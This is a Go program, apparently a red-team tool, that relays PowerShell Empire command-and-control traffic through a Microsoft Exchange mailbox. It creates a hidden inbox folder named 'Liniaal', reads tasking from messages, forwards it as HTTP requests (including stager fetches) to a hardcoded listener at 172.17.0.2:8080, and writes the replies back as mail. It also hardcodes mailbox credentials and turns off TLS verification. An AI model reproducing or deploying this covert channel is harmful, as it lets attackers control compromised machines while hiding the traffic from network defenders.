package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"os"
	"strings"
	"time"

	"github.com/sensepost/ruler/autodiscover"
	"github.com/sensepost/ruler/mapi"
	"github.com/sensepost/ruler/utils"
)

//globals
var config utils.Session
var seen [][]byte
var lastSeen time.Time
var mailpire MailPireConfig

//Agent holds information about the current agent
type Agent struct {
	Host         string //the host with Empire listener
	UserAgent    string //the UA to use for Empire
	EmailAddress string //email address of our agent
	FolderID     []byte //folder ID we are using
	MapiSession  utils.Session
}

//MailPireConfig holds global configuration data
type MailPireConfig struct {
	FolderName string //name for our hidden folder
}

func toBytes(input string) []byte {
	parts := strings.Replace(input, "-", "", -1)
	k, _ := hex.DecodeString(parts)
	k, _ = base64.StdEncoding.DecodeString(input)
	return k
}

func encodeToHex(input []byte) string {
	str := ""
	for k, v := range input {
		str += hex.EncodeToString([]byte{v})
		if k < len(input)-1 {
			str += "-"
		}
	}
	str = base64.StdEncoding.EncodeToString([]byte(input))
	return str
}
func fromUnicode(uni []byte) string {
	st := ""
	for _, k := range uni {
		if k != 0x00 {
			st += string(k)
		}
	}
	return st
}

func exit(err error) {
	//we had an error and we don't have a MAPI session
	if err != nil {
		fmt.Println(err)
		os.Exit(-1)
	}
	//let's disconnect from the MAPI session
	exitcode, err := mapi.Disconnect()
	if err != nil {
		fmt.Println(err)
	}
	os.Exit(exitcode)
}

func getMapiHTTP(email string, autoURLPtr string) *utils.AutodiscoverResp {
	var resp *utils.AutodiscoverResp
	var err error

	if autoURLPtr == "" {
		//rather use the email address's domain here and --domain is the authentication domain
		lastBin := strings.LastIndex(email, "@")
		if lastBin == -1 {
			exit(fmt.Errorf("[x] The supplied email address seems to be incorrect.\n%s", err))
		}
		maildomain := email[lastBin+1:]
		resp, _, err = autodiscover.MAPIDiscover(maildomain)
	} else {
		resp, _, err = autodiscover.MAPIDiscover(autoURLPtr)
	}

	if resp == nil || err != nil {
		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
	}
	//check if the autodiscover service responded with an error
	if resp.Response.Error != (utils.AutoError{}) {
		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
	}
	return resp
}

func getRPCHTTP(autoURLPtr string) *utils.AutodiscoverResp {
	var resp *utils.AutodiscoverResp
	var err error

	if autoURLPtr == "" {
		//rather use the email address's domain here and --domain is the authentication domain
		lastBin := strings.LastIndex(config.Email, "@")
		if lastBin == -1 {
			exit(fmt.Errorf("[x] The supplied email address seems to be incorrect.\n%s", err))
		}
		maildomain := config.Email[lastBin+1:]
		resp, _, err = autodiscover.Autodiscover(maildomain)
	} else {
		resp, _, err = autodiscover.Autodiscover(autoURLPtr)
	}

	if resp == nil || err != nil {
		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
	}
	//check if the autodiscover service responded with an error
	if resp.Response.Error != (utils.AutoError{}) {
		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
	}

	url := ""
	user := ""
	for _, v := range resp.Response.Account.Protocol {
		if v.Type == "EXPR" {
			if v.SSL == "Off" {
				url = "http://" + v.Server
			} else {
				url = "https://" + v.Server
			}
			if v.AuthPackage == "Ntlm" { //set the encryption on if the server specifies NTLM auth
				config.RPCEncrypt = true
			}
		}
		if v.Type == "EXCH" {
			user = v.Server
		}
	}
	config.RPCURL = fmt.Sprintf("%s/rpc/rpcproxy.dll?%s:6001", url, user)
	config.RPCMailbox = user

	return resp
}

func sendMessage(agent *Agent, rpc string) {

	folderid := agent.FolderID
	propertyTagx := make([]mapi.TaggedPropertyValue, 7)

	propertyTagx[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PropertyTag{PropertyType: mapi.PtypString, PropertyID: 0x001A}, PropertyValue: utils.UniString("IPM.Note")}
	propertyTagx[1] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagConversationTopic, PropertyValue: utils.UniString("mailpirein")}
	propertyTagx[2] = mapi.PidTagIconIndex
	propertyTagx[3] = mapi.PidTagMessageEditorFormat
	propertyTagx[4] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagNativeBody, PropertyValue: []byte{0x00, 0x00, 0x00, 0x01}}
	propertyTagx[5] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagSubject, PropertyValue: utils.UniString("uncommailpirein")}
	propertyTagx[6] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagNormalizedSubject, PropertyValue: utils.UniString("mailpirein")}

	x, er := mapi.CreateMessage(folderid, propertyTagx)

	if er != nil {
		//exit(er)
	}
	//because I don't know..
	rpc = string(append([]byte{0x41, 0x41}, []byte(rpc)...))
	bodyProp := mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagBody, PropertyValue: utils.UniString(rpc)}
	mapi.SetPropertyFast(folderid, x.MessageID, bodyProp)

	completeSubject := mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagSubject, PropertyValue: utils.UniString("xxmailpirein")}
	mapi.SetPropertyFast(folderid, x.MessageID, completeSubject)

}

func getMessage(agent *Agent) string {
	mapi.AuthSession = &agent.MapiSession
	folderid := agent.FolderID
	rpc := ""
	stop := false
	for {
		rows, err := mapi.GetContents(folderid)
		if err != nil {
			time.Sleep(time.Second * (time.Duration)(2))
			continue
		}
		if rows == nil {
			mapi.ReleaseObject(0x01)
			mapi.GetFolder(mapi.INBOX, nil)
			continue
		}
		if rows != nil {

			if rows.RowCount == 0 {
				time.Sleep(time.Second * (time.Duration)(2))
				continue
			}
			for k := 0; k < len(rows.RowData); k++ {
				x := fromUnicode(rows.RowData[k][0].ValueArray)
				messageid := rows.RowData[k][1].ValueArray

				if strings.ToUpper(x) == "MAILPIREOUT" {
					//fetch full message
					cols := make([]mapi.PropertyTag, 1)

					cols[0] = mapi.PidTagBody //Html

					buff, err := mapi.GetMessageFast(folderid, messageid, cols)
					if err != nil {
						fmt.Println(err)
					}
					//convert buffer to rows
					messagerows := mapi.DecodeBufferToRows(buff.TransferBuffer, cols)

					stop = false
					payload := fromUnicode(messagerows[0].ValueArray[:len(messagerows[0].ValueArray)-4])

					if payload == "" {
						continue
					}
					//we also need to mark the message for deletion
					_, err = mapi.DeleteMessages(folderid, 1, messageid)
					if err != nil {
						fmt.Println(err)
					}

					client := &http.Client{}
					var req *http.Request
					lastSeen = time.Now()

					if strings.ToUpper(string(payload[0:5])) == "POST " {
						pp := toBytes(payload[7:])
						fmt.Println("POST: ")
						req, _ = http.NewRequest("POST", fmt.Sprintf("%s/index.jsp", agent.Host), bytes.NewBuffer(pp))
						req.Header.Add("Content-Type", "application/binary")
						req.Header.Add("User-Agent", agent.UserAgent)
					} else if strings.ToUpper(string(payload[0:3])) == "GET" {
						fmt.Println("GET")
						pi := strings.Split(payload, "-")
						uri := pi[2]
						c := &http.Cookie{Name: "session", Value: pi[1], HttpOnly: false}
						req, _ = http.NewRequest("GET", fmt.Sprintf("%s/%s", agent.Host, uri), nil)
						req.Header.Add("Content-Type", "application/binary")
						req.Header.Add("User-Agent", agent.UserAgent)
						req.AddCookie(c)
					} else if strings.ToUpper(string(payload[0:5])) == "POSTM" {
						pi := strings.Split(payload, "-")
						fmt.Println("POSTM: ")
						uri := pi[1]
						c := &http.Cookie{Name: "session", Value: pi[1], HttpOnly: false}
						lenn := len(pi[0]) + len(pi[1]) + 3
						pp := toBytes(payload[lenn:])
						req, _ = http.NewRequest("POST", fmt.Sprintf("%s/%s", agent.Host, uri), bytes.NewBuffer(pp))
						req.Header.Add("Content-Type", "application/binary")
						req.Header.Add("User-Agent", agent.UserAgent)
						req.AddCookie(c)
					} else if strings.ToUpper(string(payload[0:5])) == "STAGE" {
						pi := strings.Split(payload, "-")
						fmt.Println("STAGE: ")
						uri := pi[1]
						c := &http.Cookie{Name: "session", Value: pi[1], HttpOnly: false}
						req, _ = http.NewRequest("GET", fmt.Sprintf("%s/%s", agent.Host, uri), nil)
						req.Header.Add("Content-Type", "application/binary")
						req.Header.Add("User-Agent", agent.UserAgent)
						req.AddCookie(c)
					}
					resp, err := client.Do(req)
					if resp != nil {
						defer resp.Body.Close()
					}
					if err != nil {
						return ""
					}
					body, err := ioutil.ReadAll(resp.Body)
					if err != nil {
						return ""
					}
					//stop = true
					rpc = encodeToHex(body)
					return rpc
				} else if rows.RowCount == 1 {
					time.Sleep(time.Second * (time.Duration)(5))
				}
			}
		}
		if stop == true {
			break
		}
	}
	return rpc
}

func setupSession(email, username, password string) Agent {
	var config utils.Session
	//setup our autodiscover service
	config.Domain = ""
	config.User = username
	config.Pass = password
	config.Email = email
	config.NTHash, _ = hex.DecodeString("aa")
	config.Basic = false
	config.Insecure = true
	config.Verbose = false
	config.Admin = false
	config.RPCEncrypt = false
	config.CookieJar, _ = cookiejar.New(nil)

	autodiscover.SessionConfig = &config

	var resp *utils.AutodiscoverResp
	//var err error

	var mapiURL, abkURL, userDN string

	resp = getMapiHTTP(email, "")
	mapiURL = mapi.ExtractMapiURL(resp)
	abkURL = mapi.ExtractMapiAddressBookURL(resp)
	userDN = resp.Response.User.LegacyDN
	if mapiURL == "" {
		exit(fmt.Errorf("[x] No MAPI URL found. Exiting"))
	}

	mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)

	agent := Agent{}
	agent.MapiSession = *mapi.AuthSession
	agent.EmailAddress = email
	return agent
}

func runAgent(agent Agent) {

	mapi.AuthSession = &agent.MapiSession
	logon, err := mapi.Authenticate()

	if err != nil {
		exit(err)
	} else if logon.MailboxGUID != nil {
		propertyTags := make([]mapi.PropertyTag, 2)
		propertyTags[0] = mapi.PidTagDisplayName
		propertyTags[1] = mapi.PidTagSubfolders

		rows, er := mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])

		if er != nil {
			//fmt.Println("[*] No Subfolders, so create our hidden folder")

			mapi.GetFolder(mapi.INBOX, propertyTags)
			r, err := mapi.CreateFolder(mailpire.FolderName, true)
			if err != nil {
				return
			}
			agent.FolderID = r.FolderID
		} else {
			for k := 0; k < len(rows.RowData); k++ {
				//convert string from unicode and then check if it is our target folder
				if fromUnicode(rows.RowData[k][0].ValueArray) == mailpire.FolderName {
					agent.FolderID = rows.RowData[k][1].ValueArray
				}
			}
			if len(agent.FolderID) == 0 {
				//fmt.Println("[*] Can't find our folder, so create our hidden folder")
				mapi.AuthSession = &agent.MapiSession
				mapi.GetFolder(mapi.INBOX, propertyTags)
				_, err := mapi.CreateFolder(mailpire.FolderName, true)
				if err != nil {
					return
				}
				rows, _ = mapi.GetSubFolders(mapi.AuthSession.Folderids[mapi.INBOX])

				for k := 0; k < len(rows.RowData); k++ {
					//convert string from unicode and then check if it is our target folder
					if fromUnicode(rows.RowData[k][0].ValueArray) == mailpire.FolderName {
						agent.FolderID = rows.RowData[k][1].ValueArray
					}
				}
			}
		}
		//fmt.Printf("Folderid: %x\n", agent.FolderID)
		for {
			rpc := getMessage(&agent)
			if rpc != "" {
				fmt.Println("Sending message of length: ", len(rpc))
				sendMessage(&agent, rpc)
				fmt.Println("Sent message")
			}
		}
	}
}
func main() {
	mailpire = MailPireConfig{FolderName: "Liniaal"}
	agent := setupSession("jamesthetester@outlook.com", "", "heyJames1987")
	agent.Host = "http://172.17.0.2:8080"
	go runAgent(agent)
	x := make(chan bool, 1)
	<-x
}
